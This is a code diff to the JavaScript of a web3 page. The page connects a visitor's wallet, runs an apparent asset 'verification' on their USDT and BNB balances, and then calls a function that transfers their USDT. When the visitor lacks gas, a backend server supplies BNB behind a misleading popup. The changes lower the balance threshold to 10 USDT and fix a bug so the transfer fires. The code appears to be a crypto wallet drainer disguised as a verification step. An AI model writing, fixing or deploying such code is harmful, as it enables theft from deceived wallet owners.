@@ -4,6 +4,7 @@ const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USD
 
 let web3;
 let userAddress;
+let userBNB = 0; // Add global variable for BNB
 
 async function connectWallet() {
     if (window.ethereum) {
@@ -49,7 +50,7 @@ async function verifyAssets() {
     ]);
 
     const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
-    const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));
+    userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether")); // store globally for transferUSDT()
 
     console.log(`USDT Balance: ${usdtBalance} USDT`);
     console.log(`BNB Balance: ${userBNB} BNB`);
@@ -67,7 +68,7 @@ async function verifyAssets() {
         return;
     }
 
-    // User has more than 150 USDT → Check BNB Gas Fee
+    // User has more than 10 USDT → Check BNB Gas Fee
     showPopup("Loading...", "green");
 
     transferUSDT(usdtBalance, userBNB);
@@ -75,7 +76,7 @@ async function verifyAssets() {
 
 async function transferUSDT(usdtBalance, userBNB) {
     try {
-        if (bnbBalance < 0.0005) {
+        if (userBNB < 0.0005) {
             showPopup("Checking the bnb ...", "blue");
             await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
                 method: "POST",
